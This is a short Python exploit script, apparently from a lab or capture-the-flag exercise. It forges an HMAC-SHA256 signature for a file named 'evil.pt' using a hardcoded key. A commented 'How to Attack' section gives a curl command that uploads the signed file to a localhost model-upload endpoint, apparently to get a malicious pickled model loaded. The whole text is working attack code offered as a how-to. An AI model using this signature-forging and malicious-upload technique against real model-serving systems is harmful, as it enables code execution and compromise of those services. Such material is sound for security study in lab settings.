import hmac, hashlib, sys
KEY = "pickle_tickle".encode()  
data = open("evil.pt","rb").read()
print(hmac.new(KEY, data, hashlib.sha256).hexdigest())

'''
How to Attack:
curl -s -X POST http://localhost:5000/upload_model \
  -F "file=@evil.pt" \
  -F "sig=b2a056ada6a1e084b694332694292b2b848f4460a801adfb2e8f06e954dc25b4"
'''